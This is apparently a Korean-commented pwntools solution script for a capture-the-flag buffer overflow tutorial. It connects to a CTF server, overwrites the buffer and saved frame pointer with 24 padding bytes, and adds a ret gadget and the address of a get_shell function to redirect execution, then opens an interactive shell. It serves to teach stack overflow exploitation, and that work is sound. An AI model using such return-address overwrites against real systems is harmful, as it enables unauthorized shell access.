from pwn import *
# process를 실행하기 위한 함수
# remote로 접속하려면 remote 함수를 사용해야함
# ex) r = remote( "hostname", port )
r = remote( "ctf.keeper.or.kr", 1010 )

# r = process( "./bof_tutorial" )
payload = b"A" * 24 # buf( 16 bytes ) + SFP( 8 bytes )
payload += p64( 0x40101a ) # system 함수 내부 구현 때문에 ret gad
payload += p64( 0x4011b7 ) # get_shell
# payload를 입력하기 위한 함수.
# 끝에 '\n'까지 붙여주는 기능을 갖고 있음.
r.sendline( payload )
# shell을 획득하고 나서 직접적인 상호작용을 위한 함수
r.interactive()
